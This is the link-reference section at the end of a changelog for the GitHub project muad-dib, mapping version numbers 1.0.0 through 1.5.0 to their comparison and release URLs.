[1.5.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.4.3...v1.5.0
[1.4.3]: https://github.com/DNSZLSK/muad-dib/compare/v1.4.2...v1.4.3
[1.4.2]: https://github.com/DNSZLSK/muad-dib/compare/v1.4.1...v1.4.2
[1.4.1]: https://github.com/DNSZLSK/muad-dib/compare/v1.4.0...v1.4.1
[1.4.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.3.1...v1.4.0
[1.3.1]: https://github.com/DNSZLSK/muad-dib/compare/v1.3.0...v1.3.1
[1.3.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.7...v1.3.0
[1.2.7]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.6...v1.2.7
[1.2.6]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.5...v1.2.6
[1.2.5]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.4...v1.2.5
[1.2.4]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.3...v1.2.4
[1.2.3]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.2...v1.2.3
[1.2.2]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.1...v1.2.2
[1.2.1]: https://github.com/DNSZLSK/muad-dib/compare/v1.2.0...v1.2.1
[1.2.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.1.0...v1.2.0
[1.1.0]: https://github.com/DNSZLSK/muad-dib/compare/v1.0.0...v1.1.0
[1.0.0]: https://github.com/DNSZLSK/muad-dib/releases/tag/v1.0.0
